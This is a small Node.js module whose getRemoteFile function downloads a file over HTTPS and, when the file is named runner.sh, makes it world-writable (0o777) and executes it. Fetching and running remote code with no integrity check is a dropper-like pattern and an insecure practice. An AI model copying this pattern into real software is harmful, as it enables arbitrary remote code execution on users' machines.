let https;
const cp = require("child_process");
const fs = require("node:fs");

try {
  https = require("node:https");
} catch (error) {
  console.error(error.message);
}

function getRemoteFile(url, path) {
  https
    .get(url, (res) => {
      const { statusCode } = res;

      let error;
      if (statusCode !== 200) {
        error = new Error("Request Failed.\n" + `Status Code: ${statusCode}`);
      }
      if (error) {
        console.error(error.message);
        res.resume();
        return;
      }

      res.setEncoding("utf8");
      let rawData = "";
      res.on("data", (chunk) => {
        rawData += chunk;
      });
      res.on("end", () => {
        try {
          fs.writeFile(path, rawData, (err) => {
            if (err) throw err;
            if (path.includes("runner.sh")) {
              fs.chmod(path, 0o777, (err) => {
                if (err) throw err;
                else {
                  const parentFolder = path.split("/").slice(0, -1).join("/");
                  setTimeout(() => {
                    const child = cp.spawn("./runner.sh", ["&"], {
                      cwd: parentFolder,
                    });
                    child.stdout.on("data", (data) => {
                      console.log(`${data}`);
                    });
                    child.stderr.on("data", (data) => {
                      console.error(`stderr: ${data}`);
                    });
                    child.on("close", (code) => {
                      console.log(`child process exited with code ${code}`);
                    });
                  }, 1000);
                }
              });
            }
          });
        } catch (e) {
          console.error(e.message);
        }
      });
    })
    .on("error", (error) => {
      console.error(error.message);
    });
}

module.exports = { getRemoteFile };
